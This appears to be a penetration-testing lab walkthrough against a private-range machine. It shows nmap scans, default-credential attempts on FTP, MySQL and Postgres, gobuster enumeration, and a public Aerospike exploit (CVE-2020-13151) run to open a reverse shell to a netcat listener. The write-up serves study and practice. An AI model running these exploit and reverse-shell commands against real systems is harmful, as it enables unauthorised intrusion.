**Initial Nmap Scan:**
```
nmap 192.168.191.143 -oN dnmap
```
![[Pasted image 20240602182259.png]]In Initial scan we can see lot of open ports.

**Service and Script Scan:**
```
nmap -sC -sV -oN snmap 192.168.191.143
```
![[Pasted image 20240602182551.png]]
![[Pasted image 20240602182615.png]]
Now will enumerate each port one by one

**Port 21: FTP**
```
ftp 192.168.191.143
```
![[Pasted image 20240602183007.png]]
Tried Anonymous login and admin:admin, no luck. will move other ports.

**Port 80: Http**
![[Pasted image 20240602183156.png]]
We can see an apache page is running, I have checked exploits the apache version running (2.4.41), there is no exploit for the running version.

**Port 81: Http**
![[Pasted image 20240602183414.png]]
On port 81 there is we webpage powered by nginx and fedora.

**Port 3306: Mysql**
```
mysql -u root -h 192.168.191.143
mysql -u root -h 192.168.191.143 -p
mysql -u root -h 192.168.191.143 -ppassword
```
![[Pasted image 20240602183709.png]]
No luck with mysql, will move on.

**Port 5432: Psql**
```
psql -U postgres -p 5432 -h 192.168.191.143
```
![[Pasted image 20240602184106.png]]
We are not allowed to login from our kali.

**Directory Enumeration:**
Will use Gobuster on both http ports 80 and 81 for directory traversal.

**Using Gobuster on Port 80 and 81:**
```
gobuster dir -u http://192.168.191.143/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt

gobuster dir -u http://192.168.191.143:81/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster81.txt
```

![[Pasted image 20240602184703.png]]
From this listing, directory /sub and /api is interesting on port 80

![[Pasted image 20240602184830.png]]
on port 81, so far now interesting directories.

**Now will Traverse through /sub on port 80:**
```
gobuster dir -u http://192.168.191.143/sub/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster_sub.txt
```

![[Pasted image 20240602185403.png]]

**http://192.168.191.143/sub
![[Pasted image 20240602185635.png]]

**http://192.168.191.143/sub/page
![[Pasted image 20240602185732.png]]

**Gobuster for /api:**
```
gobuster dir -u http://192.168.191.143/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster_api.txt
```
![[Pasted image 20240602191034.png]]
At initial stage, there is no interesting directories, but i got it after some times.
![[Pasted image 20240602191226.png]]
So we have /api/heartbeat.php, /api/heartbeat.

**http://192.168.191.143/api/heartbeat
![[Pasted image 20240602191348.png]]

http://192.168.191.143/api/heartbeat.php
![[Pasted image 20240602191420.png]]

Same results for both listing, let's enumerate **Aerospike** service, because that the unique one.

Will try to get Initial foothold on the system with our findings. If We can't then will come back here again and dig further.

**Searching public exploit for Aerospike:**
![[Pasted image 20240602192213.png]]
Will choose 2nd one, because it has POC

**Link for the Exploit:https://github.com/b4ny4n/CVE-2020-13151
![[Pasted image 20240602192354.png]]
So we need all three programs to get a shell from the target.

**I have copied all three Programs to my local directory:**
![[Pasted image 20240602192615.png]]
**Lets run the Program According to the POC:https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html
![[Pasted image 20240602192711.png]]

**Lets try now:**
```
python3 exp.py --ahost 192.168.191.143 --pythonshell --lhost 192.168.45.177 --lport 443
```
![[Pasted image 20240602192823.png]]
**On the same time i have started Netcat Listener on Port 443:**
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240602192938.png]]
Alright, We are into the machine Now....!



